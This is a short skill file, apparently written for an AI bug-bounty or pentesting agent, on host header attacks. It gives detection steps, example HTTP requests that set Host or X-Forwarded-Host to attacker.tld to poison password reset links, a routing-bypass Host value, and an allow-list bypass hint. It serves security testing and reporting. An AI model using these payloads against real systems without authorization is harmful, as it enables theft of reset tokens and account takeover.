# SKILL: Host Header Attacks (Password reset poisoning, Cache key, Routing bypass)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (host header attacks (password reset poisoning, cache key, routing bypass)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Apps trust `Host:` for URL building. Inject attacker's domain → password reset link points at attacker.tld → ATO.

---

## DETECTION
Trigger password reset; intercept; modify `Host:` header to attacker.tld; observe email link.

## EXPLOITATION
### Reset poisoning
```http
POST /api/forgot HTTP/1.1
Host: attacker.tld
{"email":"victim@target.com"}
```
Email link: `https://attacker.tld/reset?token=...`. Victim clicks → token sent to attacker.

### X-Forwarded-Host variant
```http
Host: target.com
X-Forwarded-Host: attacker.tld
```

### Routing bypass
```http
Host: admin.internal.target.com
```
If front-end routes by Host, you can hit internal vhosts.

### Cache poisoning
See cache_poisoning.md.

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Some apps have allow-list — bypass via subdomain CNAME you control + Host header containing both.

## CHAIN POTENTIAL
Host injection → reset poisoning → ATO.

## TOOLS
Burp Repeater

## COMMANDS
Burp

## EDGE CASES / NOT-A-BUG TRAPS
Modern frameworks use ALLOWED_HOSTS; misconfig still common.

## TRIAGE ANGLE (per platform)
Show end-to-end ATO via the poisoned reset email.

## SEVERITY & CVSS
8.5+.

## REFERENCES
PortSwigger Host Header Attacks • Skeletor's Host header writeup
